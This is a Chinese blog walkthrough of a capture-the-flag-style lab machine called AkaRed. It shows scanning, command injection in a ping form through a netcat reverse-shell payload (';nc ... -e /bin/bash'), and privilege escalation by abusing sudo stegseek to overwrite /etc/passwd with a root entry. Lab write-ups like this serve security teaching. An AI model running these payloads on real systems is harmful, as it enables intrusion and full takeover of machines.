@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPH.github.io/plugins/theme.js'></script>
+    <link rel="icon" href="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200557660.ico">
+<meta name="description" content="## 1. 简介
+
+**靶机名称**: AkaRed (未发布，内部测试靶机，可能后续发布于 HackMyVm)
+**难度**: 超级简单
+**攻击者 IP:** `192.168.205.128` (Kali Linux)
+**目标 IP:** `192.168.205.185` (AkaRed)
+
+## 1. 信息收集 (Enumeration)
+
+此阶段旨在发现目标并了解其开放的服务。">
+<meta property="og:title" content="渗透测试报告 - AkaRed (测试靶机)">
+<meta property="og:description" content="## 1. 简介
+
+**靶机名称**: AkaRed (未发布，内部测试靶机，可能后续发布于 HackMyVm)
+**难度**: 超级简单
+**攻击者 IP:** `192.168.205.128` (Kali Linux)
+**目标 IP:** `192.168.205.185` (AkaRed)
+
+## 1. 信息收集 (Enumeration)
+
+此阶段旨在发现目标并了解其开放的服务。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20AkaRed%20%28-ce-shi-ba-ji-%29.html">
+<meta property="og:image" content="https://hub.gitmirror.com/https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250320200605137.png">
+<title>渗透测试报告 - AkaRed (测试靶机)</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">渗透测试报告 - AkaRed (测试靶机)</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/56" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h2>1. 简介</h2>
+<p><strong>靶机名称</strong>: AkaRed (未发布，内部测试靶机，可能后续发布于 HackMyVm)<br>
+<strong>难度</strong>: 超级简单<br>
+<strong>攻击者 IP:</strong> <code class="notranslate">192.168.205.128</code> (Kali Linux)<br>
+<strong>目标 IP:</strong> <code class="notranslate">192.168.205.185</code> (AkaRed)</p>
+<h2>1. 信息收集 (Enumeration)</h2>
+<p>此阶段旨在发现目标并了解其开放的服务。</p>
+<h3>1.1. 网络发现 (Network Discovery)</h3>
+<p>使用 <code class="notranslate">arp-scan</code> 在本地网络中探测存活主机，因为它通过 ARP 请求进行扫描，通常比 IP/端口扫描更快且不易被防火墙拦截。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ sudo arp-scan -l <span class="pl-c"><span class="pl-c">#</span> -l 表示扫描本地网络</span>
+
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+<span class="pl-c"><span class="pl-c">#</span> ... (其他主机) ...</span>
+192.168.205.185 08:00:27:3b:24:68       PCS Systemtechnik GmbH  <span class="pl-c"><span class="pl-c">#</span> &lt;-- 发现目标</span>
+<span class="pl-c"><span class="pl-c">#</span> ... (其他主机) ...</span>
+
+Ending arp-scan 1.10.0: 256 hosts scanned <span class="pl-k">in</span> 2.036 seconds (125.74 hosts/sec). 4 responded</pre></div>
+<p>目标主机 IP 确定为 <code class="notranslate">192.168.205.185</code>。MAC 地址 <code class="notranslate">08:00:27:3b:24:68</code> 对应的厂商 <code class="notranslate">PCS Systemtechnik GmbH</code> 通常与 Oracle VirtualBox 相关联。</p>
+<h3>1.2. 端口扫描 (Port Scanning)</h3>
+<p>使用 <code class="notranslate">nmap</code> 对目标进行端口扫描，识别开放的 TCP 端口及运行的服务。</p>
+<ul>
+<li>
+<p>首先进行全端口扫描 (<code class="notranslate">-p-</code>)，确保不遗漏任何可能开放的端口。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -p- 192.168.205.185    
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 20:21 CST
+Nmap scan report <span class="pl-k">for</span> 192.168.205.185
+Host is up (0.00016s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:3B:24:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.28 seconds</pre></div>
+</li>
+<li>
+<p>针对已发现的端口进行更详细的服务版本探测。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -p22,80 -sV 192.168.205.185
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 20:21 CST
+Nmap scan report <span class="pl-k">for</span> 192.168.205.185
+Host is up (0.00027s latency).
+
+PORT   STATE SERVICE    VERSION
+22/tcp open  tcpwrapped
+80/tcp open  http       Apache httpd 2.4.59 <span class="pl-s"><span class="pl-pds">((</span>Debian<span class="pl-pds">))</span></span>
+MAC Address: 08:00:27:3B:24:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 6.58 seconds</pre></div>
+<p>扫描结果确认端口 22 (SSH) 和 80 (HTTP) 开放。</p>
+</li>
+</ul>
+<h3>1.3. Web 服务探测 (Web Enumeration)</h3>
+<p>使用 <code class="notranslate">curl</code> 检查 80 端口的 HTTP 服务，获取网页内容。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl 192.168.205.185
+<span class="pl-k">&lt;</span><span class="pl-k">!</span>DOCTYPE html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>head<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>title<span class="pl-k">&gt;</span>CyberPing <span class="pl-k">2077&lt;</span>/title<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span><span class="pl-k">!</span>-- ... CSS (已省略) ... --<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/head<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>body<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>container<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>h1 class=<span class="pl-s"><span class="pl-pds">"</span>glitch<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>⮟ CYBERPING 2077 ⮟<span class="pl-k">&lt;</span>/h<span class="pl-k">1&gt;</span>
+        <span class="pl-k">&lt;</span>form method=<span class="pl-s"><span class="pl-pds">"</span>post<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+            <span class="pl-k">&lt;</span>input type=<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span> name=<span class="pl-s"><span class="pl-pds">"</span>ip<span class="pl-pds">"</span></span> placeholder=<span class="pl-s"><span class="pl-pds">"</span>Enter target IP/command<span class="pl-pds">"</span></span> required<span class="pl-k">&gt;</span>
+            <span class="pl-k">&lt;</span>button type=<span class="pl-s"><span class="pl-pds">"</span>submit<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>Execute Command<span class="pl-k">&lt;</span>/button<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>/form<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/body<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span></pre></div>
+<p>网页标题为 "CyberPing 2077"，包含一个表单，输入框 <code class="notranslate">name="ip"</code> 且提示为 "Enter target IP/command"。这极有可能是一个允许用户输入 IP 地址执行 <code class="notranslate">ping</code> 命令的功能，并且存在命令注入的风险。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/56be19ed546680026859cecc00acd07040d3d9c014bfd76fb921ec846337d3e8/68747470733a2f2f6875622e6769746d6972726f722e636f6d2f68747470733a2f2f6769746875622e636f6d2f377231554d50482f377231554d50482e6769746875622e696f2f626c6f622f6d61696e2f2f7374617469632f696d6167652f32303235303431313230323235393938312e706e67"><img src="https://camo.githubusercontent.com/56be19ed546680026859cecc00acd07040d3d9c014bfd76fb921ec846337d3e8/68747470733a2f2f6875622e6769746d6972726f722e636f6d2f68747470733a2f2f6769746875622e636f6d2f377231554d50482f377231554d50482e6769746875622e696f2f626c6f622f6d61696e2f2f7374617469632f696d6167652f32303235303431313230323235393938312e706e67" alt="" data-canonical-src="https://hub.gitmirror.com/https://github.com/7r1UMPH/7r1UMPH.github.io/blob/main//static/image/20250411202259981.png" style="max-width: 100%;"></a></p>
+<h2>2. 获取初始访问权限 (Initial Access - Command Injection)</h2>
+<p>此阶段利用 Web 应用的漏洞获取目标服务器的 Shell。</p>
+<h3>2.1. 确认漏洞 (Confirming Vulnerability)</h3>
+<p>为验证命令注入，我们在 Web 表单中输入攻击者的 IP 地址 <code class="notranslate">192.168.205.128</code>，并期望目标服务器执行 <code class="notranslate">ping 192.168.205.128</code>。同时，在攻击者机器上启动 <code class="notranslate">tcpdump</code> 监听 ICMP 流量。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ sudo tcpdump -A -n icmp
+<span class="pl-c"><span class="pl-c">#</span> -A: 以 ASCII 打印报文内容</span>
+<span class="pl-c"><span class="pl-c">#</span> -n: 不解析主机名</span>
+<span class="pl-c"><span class="pl-c">#</span> icmp: 只捕获 ICMP 协议流量</span>
+tcpdump: verbose output suppressed, use -v[v]... <span class="pl-k">for</span> full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/dac372719b393a0ae1bdbc6840b974b16397f5b0c72fd36b1541c2ab61d44b13/68747470733a2f2f6875622e6769746d6972726f722e636f6d2f68747470733a2f2f6769746875622e636f6d2f377231554d50482f377231554d50482e6769746875622e696f2f626c6f622f6d61696e2f2f7374617469632f696d6167652f32303235303431313230323335373638362e706e67"><img src="https://camo.githubusercontent.com/dac372719b393a0ae1bdbc6840b974b16397f5b0c72fd36b1541c2ab61d44b13/68747470733a2f2f6875622e6769746d6972726f722e636f6d2f68747470733a2f2f6769746875622e636f6d2f377231554d50482f377231554d50482e6769746875622e696f2f626c6f622f6d61696e2f2f7374617469632f696d6167652f32303235303431313230323335373638362e706e67" alt="" data-canonical-src="https://hub.gitmirror.com/https://github.com/7r1UMPH/7r1UMPH.github.io/blob/main//static/image/20250411202357686.png" style="max-width: 100%;"></a></p>
+<p>在 Web 页面提交 IP 后，<code class="notranslate">tcpdump</code> 捕获到来自目标 IP 的 ICMP 请求：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">20:23:39.932006 IP 192.168.205.185 <span class="pl-k">&gt;</span> 192.168.205.128: ICMP <span class="pl-c1">echo</span> request, id 1016, seq 1, length 64
+<span class="pl-c"><span class="pl-c">#</span> ... (其他 ICMP 请求和响应) ... </span></pre></div>
+<p>这证实了 Web 应用确实执行了用户输入的命令（至少是 <code class="notranslate">ping</code>），存在命令注入漏洞。</p>
+<h3>2.2. 漏洞利用 (Exploitation - Reverse Shell)</h3>
+<p>利用命令注入点执行一个反向 Shell Payload。使用分号 <code class="notranslate">;</code> 作为命令分隔符，先结束可能存在的 <code class="notranslate">ping</code> 命令，然后执行 <code class="notranslate">netcat</code> 命令将目标服务器的 <code class="notranslate">/bin/bash</code> Shell 反弹回攻击者机器。</p>
+<ul>
+<li>
+<p><strong>Payload:</strong></p>
+<pre class="notranslate"><code class="notranslate">;nc 192.168.205.128 8888 -e /bin/bash
+</code></pre>
+<p>(注意：<code class="notranslate">;</code> 确保 <code class="notranslate">nc</code> 命令独立执行。<code class="notranslate">-e /bin/bash</code> 指定连接成功后执行的程序。)</p>
+</li>
+<li>
+<p><strong>攻击者监听:</strong> 在 Kali 上使用 <code class="notranslate">netcat</code> 监听 8888 端口。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8888
+<span class="pl-c"><span class="pl-c">#</span> -l: 监听模式</span>
+<span class="pl-c"><span class="pl-c">#</span> -v: 详细输出</span>
+<span class="pl-c"><span class="pl-c">#</span> -n: 不解析主机名</span>
+<span class="pl-c"><span class="pl-c">#</span> -p 8888: 指定监听端口</span>
+listening on [any] 8888 ...</pre></div>
+</li>
+<li>
+<p><strong>获取 Shell:</strong> 在 Web 页面提交 Payload 后，攻击者的 <code class="notranslate">nc</code> 监听器接收到连接。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">connect to [192.168.205.128] from (UNKNOWN) [192.168.205.185] 56366
+<span class="pl-c"><span class="pl-c">#</span> 此时已获得目标服务器 Shell，用户为 www-data</span></pre></div>
+<p>成功获取了运行 Web 服务器的用户 (<code class="notranslate">www-data</code>) 的 Shell。</p>
+</li>
+</ul>
+<h3>2.3. Shell 升级 (Shell Upgrade)</h3>
+<p>初始获得的 Shell 通常是非交互式的，功能受限（如没有 Tab 补全、无法运行 <code class="notranslate">sudo</code> 等）。需要升级为功能完整的 TTY。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在目标 Shell 中执行:</span>
+$ script /dev/null -c bash   <span class="pl-c"><span class="pl-c">#</span> 使用 script 创建一个伪终端</span>
+<span class="pl-c"><span class="pl-c">#</span> 按下 Ctrl+Z 将其置于后台</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 在攻击者 Kali 终端中执行:</span>
+┌──(kali㉿kali)-[~]
+└─$ stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>      <span class="pl-c"><span class="pl-c">#</span> 设置本地终端模式，并将后台任务调回前台</span>
+<span class="pl-c"><span class="pl-c">#</span> 按两次 Enter 键</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 回到目标 Shell 中执行:</span>
+reset xterm                  <span class="pl-c"><span class="pl-c">#</span> 重置终端类型</span>
+<span class="pl-k">export</span> TERM=xterm            <span class="pl-c"><span class="pl-c">#</span> 设置终端环境变量</span>
+<span class="pl-k">export</span> SHELL=/bin/bash       <span class="pl-c"><span class="pl-c">#</span> 设置 SHELL 环境变量</span>
+stty rows 59 cols 236      <span class="pl-c"><span class="pl-c">#</span> (可选) 设置终端尺寸以匹配本地终端</span></pre></div>
+<p>现在拥有了一个功能更完善的交互式 Shell。</p>
+<h2>3. 权限提升 (www-data -&gt; welcome)</h2>
+<p>此阶段目标是从 <code class="notranslate">www-data</code> 用户提升到权限更高的用户。</p>
+<h3>3.1. 以 www-data 身份进行信息收集 (Enumeration as www-data)</h3>
+<ul>
+<li>
+<p><strong>Web 目录探索:</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/var/www/html$ ls -al
+total 16
+<span class="pl-c"><span class="pl-c">#</span> ...</span>
+-rw-r--r-- 1 root root   21 Apr 11 06:26 robots.txt</pre></div>
+<p>发现 <code class="notranslate">robots.txt</code> 文件。</p>
+</li>
+<li>
+<p><strong>检查 <code class="notranslate">robots.txt</code>:</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/var/www/html$ cat robots.txt 
+d2VsY29tZTpha2FyZWQ=</pre></div>
+<p>这是一串 Base64 编码的字符串。</p>
+</li>
+<li>
+<p><strong>解码 Base64:</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/var/www/html$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>d2VsY29tZTpha2FyZWQ=<span class="pl-pds">'</span></span> <span class="pl-k">|</span> base64 -d
+welcome:akared</pre></div>
+<p>解码得到凭据 <code class="notranslate">welcome:akared</code>。尝试使用此凭据 <code class="notranslate">su welcome</code>，但根据后续操作判断，此密码 <strong>不正确</strong> 。</p>
+</li>
+<li>
+<p><strong>检查家目录:</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/var/www/html$ ls /home/
+welcome</pre></div>
+<p>确认存在用户 <code class="notranslate">welcome</code>。</p>
+</li>
+<li>
+<p><strong>检查 <code class="notranslate">/opt</code> 目录:</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/opt$ ls -al
+total 32
+<span class="pl-c"><span class="pl-c">#</span> ...</span>
+-rwxr-xr-x  1 root root 16912 Apr 11 06:41 showmepassword</pre></div>
+<p>发现一个名为 <code class="notranslate">showmepassword</code> 的可执行文件。</p>
+</li>
+<li>
+<p><strong>运行 <code class="notranslate">showmepassword</code>:</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/opt$ ./showmepassword 
+input to /tmp/xxoo
+when input 1000 count. u will get password.
+now it is 1 count.</pre></div>
+<p>程序提示需要运行 1000 次才能获得密码。</p>
+</li>
+<li>
+<p><strong>编写脚本运行 1000 次:</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/opt$ <span class="pl-k">for</span> <span class="pl-smi">i</span> <span class="pl-k">in</span> {1..1000}<span class="pl-k">;</span> <span class="pl-k">do</span> ./showmepassword<span class="pl-k">;</span> <span class="pl-k">done</span>
+<span class="pl-c"><span class="pl-c">#</span> ... (大量输出省略) ...</span>
+input to /tmp/xxoo
+when input 1000 count. u will get password.
+now it is 998 count.
+input to /tmp/xxoo
+when input 1000 count. u will get password.
+d2VsY2  <span class="pl-c"><span class="pl-c">#</span> &lt;-- 获取到密码片段</span>
+input to /tmp/xxoo
+when input 1000 count. u will get password.
+d2VsY2
+input to /tmp/xxoo
+when input 1000 count. u will get password.
+d2VsY2</pre></div>
+<p>在接近 1000 次时，程序输出了字符串 <code class="notranslate">d2VsY2</code>。这很可能是 <code class="notranslate">welcome</code> 用户的密码。</p>
+</li>
+</ul>
+<h3>3.2. 切换用户 (Switching User)</h3>
+<p>使用从 <code class="notranslate">showmepassword</code> 获取的密码 <code class="notranslate">d2VsY2</code> 尝试切换到 <code class="notranslate">welcome</code> 用户。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/opt$ su welcome
+Password: <span class="pl-k">&lt;</span>在此输入 <span class="pl-s"><span class="pl-pds">'</span>d2VsY2<span class="pl-pds">'</span></span><span class="pl-k">&gt;</span>
+welcome@AkaRed:/opt$ id
+uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)</pre></div>
+<p>成功切换到 <code class="notranslate">welcome</code> 用户。</p>
+<h2>4. 权限提升 (welcome -&gt; root)</h2>
+<p>此阶段目标是从 <code class="notranslate">welcome</code> 用户提升到 <code class="notranslate">root</code> 用户。</p>
+<h3>4.1. 以 welcome 身份进行信息收集 (Enumeration as welcome)</h3>
+<p>检查 <code class="notranslate">welcome</code> 用户的 <code class="notranslate">sudo</code> 权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@AkaRed:/opt$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> welcome on AkaRed:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+User welcome may run the following commands on AkaRed:
+    (ALL <span class="pl-c1">:</span> ALL) NOPASSWD: /usr/local/bin/stegseek</pre></div>
+<p>关键发现：用户 <code class="notranslate">welcome</code> 可以 <strong>无需密码</strong> (<code class="notranslate">NOPASSWD</code>) 以 <strong>任何用户</strong> (<code class="notranslate">ALL : ALL</code>) 的身份运行 <code class="notranslate">/usr/local/bin/stegseek</code> 命令。<code class="notranslate">stegseek</code> 是一个用于破解 <code class="notranslate">steghide</code> 隐写密码并提取隐藏文件的工具。其 <code class="notranslate">-xf &lt;outfile&gt;</code> 选项允许将提取的文件写入指定路径，这是一个潜在的提权向量。</p>
+<h3>4.2. 利用策略 (Exploitation Strategy)</h3>
+<p>利用 <code class="notranslate">sudo stegseek</code> 的 <code class="notranslate">-xf</code> 选项覆盖 <code class="notranslate">/etc/passwd</code> 文件，从而添加一个自定义的 root 用户。</p>
+<ol>
+<li><strong>在攻击者机器上：</strong>
+<ul>
+<li>创建一个包含自定义 root 用户条目的文件 (<code class="notranslate">malicious_passwd</code>)。该条目使用已知的密码哈希。</li>
+<li>使用 <code class="notranslate">steghide</code> 将此文件隐藏到一个图片 (<code class="notranslate">1.jpg</code>) 中，并设置一个简单的密码（如 "123456"）。</li>
+<li>启动 Web 服务器以托管此图片。</li>
+</ul>
+</li>
+<li><strong>在目标机器上 (以 welcome 用户身份)：</strong>
+<ul>
+<li>下载包含恶意 <code class="notranslate">passwd</code> 条目的图片。</li>
+<li>创建一个包含 <code class="notranslate">steghide</code> 密码 ("123456") 的文件。</li>
+<li>使用 <code class="notranslate">sudo /usr/local/bin/stegseek &lt;image_file&gt; &lt;password_file&gt; -xf /etc/passwd</code> 命令，强制 <code class="notranslate">stegseek</code> 将隐藏的文件提取并覆盖到 <code class="notranslate">/etc/passwd</code>。</li>
+<li>使用新添加的 root 用户名和对应密码进行 <code class="notranslate">su</code> 登录。</li>
+</ul>
+</li>
+</ol>
+<h3>4.3. 构造利用代码 (Attacker Machine)</h3>
+<ol>
+<li>
+<p><strong>创建恶意 passwd 文件 (<code class="notranslate">malicious_passwd</code>)</strong>:</p>
+<ul>
+<li>创建一个新用户 <code class="notranslate">a</code>，UID 和 GID 均为 0 (root 权限)。</li>
+<li>设置一个已知的密码哈希。这里使用 <code class="notranslate">$1$user3$rAGRVf5p2jYTqtqOW5cPu/</code> (假设攻击者知道其对应的明文密码，例如 'pass123')。</li>
+</ul>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>a:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> malicious_passwd </pre></div>
+</li>
+<li>
+<p><strong>准备载体图片 (<code class="notranslate">1.jpg</code>)</strong>:</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ cp <span class="pl-k">~</span>/Pictures/1.jpg <span class="pl-c1">.</span> <span class="pl-c"><span class="pl-c">#</span> 复制一个任意的 JPG 图片</span></pre></div>
+</li>
+<li>
+<p><strong>使用 <code class="notranslate">steghide</code> 嵌入数据</strong>:</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ steghide embed -ef malicious_passwd -cf 1.jpg -p <span class="pl-s"><span class="pl-pds">"</span>123456<span class="pl-pds">"</span></span> 
+<span class="pl-c"><span class="pl-c">#</span> -ef: 指定要嵌入的文件</span>
+<span class="pl-c"><span class="pl-c">#</span> -cf: 指定载体文件</span>
+<span class="pl-c"><span class="pl-c">#</span> -p: 设置嵌入/提取密码</span>
+embedding <span class="pl-s"><span class="pl-pds">"</span>malicious_passwd<span class="pl-pds">"</span></span> <span class="pl-k">in</span> <span class="pl-s"><span class="pl-pds">"</span>1.jpg<span class="pl-pds">"</span></span>... <span class="pl-k">done</span></pre></div>
+</li>
+<li>
+<p><strong>启动 HTTP 服务器托管图片</strong>:</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ python3 -m http.server 80 <span class="pl-c"><span class="pl-c">#</span> 在 80 端口启动简单 HTTP 服务器                                                                    </span>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre></div>
+</li>
+</ol>
+<h3>4.4. 执行利用代码 (Target Machine)</h3>
+<ol>
+<li>
+<p><strong>切换到可写目录并下载图片</strong>: <code class="notranslate">/tmp</code> 通常是所有用户都可写的目录。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@AkaRed:/opt$ <span class="pl-c1">cd</span> /tmp
+welcome@AkaRed:/tmp$ wget http://192.168.205.128/1.jpg
+<span class="pl-c"><span class="pl-c">#</span> ... (下载输出) ...</span>
+2025-04-11 08:29:34 (220 MB/s) - ‘1.jpg’ saved [396237/396237]</pre></div>
+</li>
+<li>
+<p><strong>创建密码文件 (<code class="notranslate">1</code>)</strong>:</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@AkaRed:/tmp$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>123456<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> 1</pre></div>
+</li>
+<li>
+<p><strong>执行 <code class="notranslate">sudo stegseek</code> 覆盖 <code class="notranslate">/etc/passwd</code></strong>:</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@AkaRed:/tmp$ sudo /usr/local/bin/stegseek 1.jpg 1 -xf /etc/passwd
+<span class="pl-c"><span class="pl-c">#</span> &lt;image_file&gt;: 载体图片</span>
+<span class="pl-c"><span class="pl-c">#</span> &lt;password_file&gt;: 包含密码的字典文件</span>
+<span class="pl-c"><span class="pl-c">#</span> -xf /etc/passwd: 将提取的文件强制写入 /etc/passwd</span>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+   
+[i] Found passphrase: <span class="pl-s"><span class="pl-pds">"</span>123456<span class="pl-pds">"</span></span>
+[i] Original filename: <span class="pl-s"><span class="pl-pds">"</span>malicious_passwd<span class="pl-pds">"</span></span>.
+[i] Extracting to <span class="pl-s"><span class="pl-pds">"</span>/etc/passwd<span class="pl-pds">"</span></span>.
+the file <span class="pl-s"><span class="pl-pds">"</span>/etc/passwd<span class="pl-pds">"</span></span> does already exist. overwrite <span class="pl-k">?</span> (y/n) 
+y <span class="pl-c"><span class="pl-c">#</span> 确认覆盖</span></pre></div>
+</li>
+<li>
+<p><strong>验证 <code class="notranslate">/etc/passwd</code> 内容</strong>:</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@AkaRed:/tmp$ cat /etc/passwd
+a:<span class="pl-smi">$1</span><span class="pl-smi">$user3$rAGRVf5p2jYTqtqOW5cPu</span>/:0:0:root:/root:/bin/bash</pre></div>
+<p>文件已被成功修改为只包含我们添加的 <code class="notranslate">a</code> 用户条目。</p>
+</li>
+</ol>
+<h3>4.5. 获取 Root 权限 (Gaining Root Access)</h3>
+<p>使用新添加的用户 <code class="notranslate">a</code> 和之前设置的密码（例如 'pass123'）进行登录。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@AkaRed:/tmp$ su a
+Password: <span class="pl-k">&lt;</span>输入 <span class="pl-s"><span class="pl-pds">'</span>pass123<span class="pl-pds">'</span></span> 或对应哈希的密码<span class="pl-k">&gt;</span>
+a@AkaRed:/tmp# id
+uid=0(a) gid=0(root) groups=0(root)
+<span class="pl-s"><span class="pl-pds">`</span><span class="pl-pds">`</span><span class="pl-pds">`</span>成功获取 root 权限。</span></pre></div>
+<h2>5. 总结 (Conclusion)</h2>
+<p>本次渗透测试通过以下步骤成功获取了 AkaRed 靶机的 root 权限：</p>
+<ol>
+<li><strong>信息收集:</strong> 通过 <code class="notranslate">arp-scan</code> 和 <code class="notranslate">nmap</code> 发现目标 IP 及开放的 SSH (22) 和 HTTP (80) 端口。</li>
